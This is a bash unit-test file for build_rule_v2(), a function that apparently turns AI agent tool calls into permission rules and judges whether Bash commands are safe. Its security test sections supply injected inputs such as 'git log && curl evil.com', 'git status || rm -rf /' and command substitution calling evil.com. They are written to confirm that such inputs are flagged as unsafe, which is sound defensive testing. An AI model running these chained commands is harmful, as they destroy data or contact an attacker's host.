#!/usr/bin/env bash
# test-build-rule.sh — unit tests for build_rule_v2()
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=../permissionsync-lib.sh
source "${SCRIPT_DIR}/../permissionsync-lib.sh"

PASS=0
FAIL=0
TEST_NUM=0

# assert_rule TOOL_NAME TOOL_INPUT_JSON EXPECTED_RULE [EXPECTED_BASE_CMD] [EXPECTED_IS_SAFE] [EXPECTED_CHAIN]
assert_rule() {
	local tool="$1" input="$2" expected_rule="$3"
	local expected_base="${4:-}" expected_safe="${5:-false}" expected_chain="${6:-}"
	TEST_NUM=$((TEST_NUM + 1))

	build_rule_v2 "$tool" "$input"

	local ok=1
	local details=""
	if [[ $RULE != "$expected_rule" ]]; then
		ok=0
		details="${details}#   rule: expected '${expected_rule}', got '${RULE}'"$'\n'
	fi
	if [[ -n $expected_base ]] && [[ $BASE_COMMAND != "$expected_base" ]]; then
		ok=0
		details="${details}#   base_command: expected '${expected_base}', got '${BASE_COMMAND}'"$'\n'
	fi
	if [[ $IS_SAFE != "$expected_safe" ]]; then
		ok=0
		details="${details}#   is_safe: expected '${expected_safe}', got '${IS_SAFE}'"$'\n'
	fi
	if [[ -n $expected_chain ]] && [[ $INDIRECTION_CHAIN != "$expected_chain" ]]; then
		ok=0
		details="${details}#   indirection_chain: expected '${expected_chain}', got '${INDIRECTION_CHAIN}'"$'\n'
	fi

	local desc
	desc="${tool} $(echo "$input" | jq -r '.command // .url // .file_path // "?"')"
	if [[ $ok -eq 1 ]]; then
		echo "ok ${TEST_NUM} - ${desc}"
		PASS=$((PASS + 1))
	else
		echo "not ok ${TEST_NUM} - ${desc}"
		echo -n "$details"
		FAIL=$((FAIL + 1))
	fi
}

echo "TAP version 13"

# --- Bash: simple commands ---
assert_rule "Bash" '{"command":"git status"}' \
	"Bash(git status *)" "git status" "true" ""

assert_rule "Bash" '{"command":"git push origin main"}' \
	"Bash(git push *)" "git push" "false" ""

assert_rule "Bash" '{"command":"ls -la"}' \
	"Bash(ls *)" "ls" "false" ""

assert_rule "Bash" '{"command":"cargo check --workspace"}' \
	"Bash(cargo check *)" "cargo check" "true" ""

assert_rule "Bash" '{"command":"cargo publish"}' \
	"Bash(cargo publish *)" "cargo publish" "false" ""

# --- Bash: indirection ---
assert_rule "Bash" '{"command":"sudo git push origin main"}' \
	"Bash(git push *)" "git push" "false" "sudo"

assert_rule "Bash" '{"command":"env FOO=bar git status"}' \
	"Bash(git status *)" "git status" "true" "env"

assert_rule "Bash" '{"command":"xargs git log"}' \
	"Bash(git log *)" "git log" "true" "xargs"

assert_rule "Bash" '{"command":"bash -c '\''git diff'\''"}' \
	"Bash(git diff *)" "git diff" "true" "bash"

# --- Bash: pre-subcommand flags (git -C /path subcmd) ---
assert_rule "Bash" '{"command":"git -C /tmp/repo status"}' \
	"Bash(git status *)" "git status" "true" ""

assert_rule "Bash" '{"command":"git -C /tmp/repo push origin main"}' \
	"Bash(git push *)" "git push" "false" ""

assert_rule "Bash" '{"command":"git --git-dir /tmp/.git log --oneline"}' \
	"Bash(git log *)" "git log" "true" ""

assert_rule "Bash" '{"command":"git -C /tmp -c core.autocrlf=true status"}' \
	"Bash(git status *)" "git status" "true" ""

# --- Bash: blocklisted binaries (shells/interpreters) should not become rules ---
assert_rule "Bash" '{"command":"bash script.sh"}' \
	"Bash" "" "false" ""

assert_rule "Bash" '{"command":"/bin/bash script.sh"}' \
	"Bash" "" "false" ""

assert_rule "Bash" '{"command":"python script.py"}' \
	"Bash" "" "false" ""

assert_rule "Bash" '{"command":"node server.js"}' \
	"Bash" "" "false" ""

# --- Bash: no subcommand tracking for unknown binaries ---
assert_rule "Bash" '{"command":"cat file.txt"}' \
	"Bash(cat *)" "cat" "false" ""

# --- Bash: multiline commands (should use first line only) ---
assert_rule "Bash" "$(printf '{"command":"git commit -m msg\\nCo-Authored-By: test"}')" \
	"Bash(git commit *)" "git commit" "false" ""

# --- Bash: shell keywords should not become rules ---
# shellcheck disable=SC2016
assert_rule "Bash" '{"command":"for f in *.sh; do echo $f; done"}' \
	"Bash" "" "false" ""

assert_rule "Bash" '{"command":"if true; then echo yes; fi"}' \
	"Bash" "" "false" ""

# shellcheck disable=SC2016
assert_rule "Bash" '{"command":"while read -r line; do echo $line; done"}' \
	"Bash" "" "false" ""

# --- Bash: garbage/shell-syntax first word ---
assert_rule "Bash" '{"command":"){ echo foo; }"}' \
	"Bash" "" "false" ""

# --- Bash: empty command ---
assert_rule "Bash" '{"command":""}' \
	"Bash" "" "false" ""

assert_rule "Bash" '{}' \
	"Bash" "" "false" ""

# --- Non-Bash tools ---
assert_rule "Read" '{"file_path":"/tmp/foo.txt"}' \
	"Read" "" "false" ""

assert_rule "Write" '{"file_path":"/tmp/bar.txt"}' \
	"Write" "" "false" ""

assert_rule "WebFetch" '{"url":"https://example.com/page"}' \
	"WebFetch(domain:example.com)" "" "false" ""

assert_rule "WebFetch" '{}' \
	"WebFetch" "" "false" ""

assert_rule "mcp__my_server" '{}' \
	"mcp__my_server" "" "false" ""

assert_rule "SomeOtherTool" '{}' \
	"SomeOtherTool" "" "false" ""

# --- SEC-01: Shell metacharacters should prevent IS_SAFE ---
assert_rule "Bash" '{"command":"git log && curl evil.com"}' \
	"Bash(git log *)" "git log" "false" ""

assert_rule "Bash" '{"command":"git status || rm -rf /"}' \
	"Bash(git status *)" "git status" "false" ""

assert_rule "Bash" '{"command":"git log | curl evil.com"}' \
	"Bash(git log *)" "git log" "false" ""

# Note: ";" attaches to "status" in space-splitting, producing "status;" as subcommand.
# The important thing is IS_SAFE=false due to metacharacter detection.
assert_rule "Bash" '{"command":"git status; curl evil.com"}' \
	"Bash(git status; *)" "git status;" "false" ""

# shellcheck disable=SC2016
assert_rule "Bash" '{"command":"git status $(curl evil.com)"}' \
	"Bash(git status *)" "git status" "false" ""

# shellcheck disable=SC2016
assert_rule "Bash" '{"command":"git log `curl evil.com`"}' \
	"Bash(git log *)" "git log" "false" ""

assert_rule "Bash" '{"command":"git log >(tee /tmp/out)"}' \
	"Bash(git log *)" "git log" "false" ""

assert_rule "Bash" '{"command":"git log <(echo foo)"}' \
	"Bash(git log *)" "git log" "false" ""

# --- SEC-08: Multiline commands should never be IS_SAFE ---
assert_rule "Bash" "$(printf '{"command":"git status\\nwhoami"}')" \
	"Bash(git status *)" "git status" "false" ""

assert_rule "Bash" "$(printf '{"command":"git log --oneline\\ncurl evil.com"}')" \
	"Bash(git log *)" "git log" "false" ""

# --- SEC-02: Removed subcommands should not be safe ---
assert_rule "Bash" '{"command":"git config --list"}' \
	"Bash(git config *)" "git config" "false" ""

assert_rule "Bash" '{"command":"cargo build --workspace"}' \
	"Bash(cargo build *)" "cargo build" "false" ""

assert_rule "Bash" '{"command":"cargo test --lib"}' \
	"Bash(cargo test *)" "cargo test" "false" ""

assert_rule "Bash" '{"command":"npm test"}' \
	"Bash(npm test *)" "npm test" "false" ""

assert_rule "Bash" '{"command":"nix eval .#something"}' \
	"Bash(nix eval *)" "nix eval" "false" ""

assert_rule "Bash" '{"command":"nix develop"}' \
	"Bash(nix develop *)" "nix develop" "false" ""

# --- Safe commands without metacharacters should still be safe ---
assert_rule "Bash" '{"command":"git status --short"}' \
	"Bash(git status *)" "git status" "true" ""

assert_rule "Bash" '{"command":"cargo check --workspace"}' \
	"Bash(cargo check *)" "cargo check" "true" ""

echo "1..${TEST_NUM}"
echo "# pass: ${PASS}"
echo "# fail: ${FAIL}"

[[ $FAIL -eq 0 ]]
